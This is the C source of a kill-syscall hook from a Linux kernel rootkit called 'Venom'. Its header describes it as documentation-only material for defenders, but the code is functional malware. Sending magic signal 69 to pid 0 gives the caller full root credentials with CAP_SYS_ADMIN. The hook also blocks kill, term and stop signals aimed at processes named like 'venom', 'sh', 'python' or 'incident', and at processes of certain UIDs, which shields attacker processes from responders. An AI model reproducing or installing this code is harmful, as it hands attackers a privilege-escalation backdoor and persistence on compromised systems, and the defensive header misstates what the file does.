/*
 * Venom 
 * ---------------------------------------------------------------------------
 * File: kill.c
 *
 * Purpose:
 *  - High-level explanation of signal delivery paths (kill/sys_kill) and how
 *    interception or unusual handling can be observed by defenders.
 *
 * Contents (documentation-only):
 *  - Get root privileges: kill -64 0 
 */


#ifndef KILL_H
#define KILL_H

#include "../include/headers.h"

static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
static int g_magic_signal = 69;

void set_magic_signal(int signal) {
    g_magic_signal = signal;
}


static notrace void give_root(void) {
    struct cred *newcreds;
    
    newcreds = prepare_creds();
    if (newcreds == NULL)
        return;
    
    newcreds->uid.val = newcreds->gid.val = 0;
    newcreds->euid.val = newcreds->egid.val = 0;
    newcreds->suid.val = newcreds->sgid.val = 0;
    newcreds->fsuid.val = newcreds->fsgid.val = 0;
    
    cap_raise(newcreds->cap_effective, CAP_SYS_ADMIN);
    cap_raise(newcreds->cap_inheritable, CAP_SYS_ADMIN);
    cap_raise(newcreds->cap_permitted, CAP_SYS_ADMIN);
    
    commit_creds(newcreds);
}


notrace static asmlinkage long hooked_kill(const struct pt_regs *regs) {
    pid_t pid = (pid_t)regs->di;
    int sig = (int)regs->si;
    

    if (sig == g_magic_signal && pid == 0) {
        printk(KERN_INFO "[VENOM] Magic signal %d detected - granting root privileges to PID %d\n", 
               g_magic_signal, current->pid);
        give_root();
        return 0; 
    }
    
    if (sig == SIGKILL || sig == SIGTERM || sig == SIGSTOP) {
        struct task_struct *target_task;
        
        rcu_read_lock();
        target_task = pid_task(find_vpid(pid), PIDTYPE_PID);
        if (target_task) {
            if (strstr(target_task->comm, "venom") || 
                strstr(target_task->comm, "python") ||
                strstr(target_task->comm, "sh") ||
                strstr(target_task->comm, "server") ||
                strstr(target_task->comm, "incident")) {
                
                rcu_read_unlock();
                printk(KERN_INFO "[VENOM] Blocked attempt to kill protected process: %s (PID: %d)\n", 
                       target_task->comm, pid);
                return 0; 
            }
            

            if (target_task->cred->uid.val == 1001 || 
                target_task->cred->uid.val == 1002) {  
                rcu_read_unlock();
                printk(KERN_INFO "[VENOM] Blocked attempt to kill process (UID: %d)\n", 
                       target_task->cred->uid.val);
                return 0;
            }
        }
        rcu_read_unlock();
    }
    

    return orig_kill(regs);
}

#endif 

